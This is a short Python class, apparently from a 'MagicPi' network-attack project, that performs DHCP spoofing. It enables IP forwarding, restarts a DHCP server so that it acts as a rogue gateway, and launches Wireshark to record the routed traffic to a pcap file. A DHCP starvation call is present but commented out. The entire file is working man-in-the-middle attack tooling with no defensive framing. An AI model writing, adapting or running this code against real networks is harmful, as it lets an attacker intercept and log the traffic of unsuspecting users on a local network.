from os import system


class SpoofingAction:

    env = None
    DHCPmodel = None

    def __init__(self,Environement):
        self.env = Environement
        self.DHCPmodel = self.env.getModel('DHCP')
        system('pkill wireshark')

    def run(self):
        print('\033[1m' + '--------------------------------------------\n'
                          '[*] SpoofingAction running. It will try to spoof the DHCP.\n' + '\033[0m')
        #self.DHCPmodel.DHCP_Discover_Dos()
        print('[*] Starting routing mode...')
        system('sysctl net.ipv4.ip_forward=1')
        print('[*] Starting DHCP server...')
        system('systemctl restart dhcpd4')
        print('[*] Logging trafic...')
        system('sudo su magicpi -c "wireshark -qw /home/magicpi/MagicPi-Project/tmpfiles/wireshark.pcap &"')
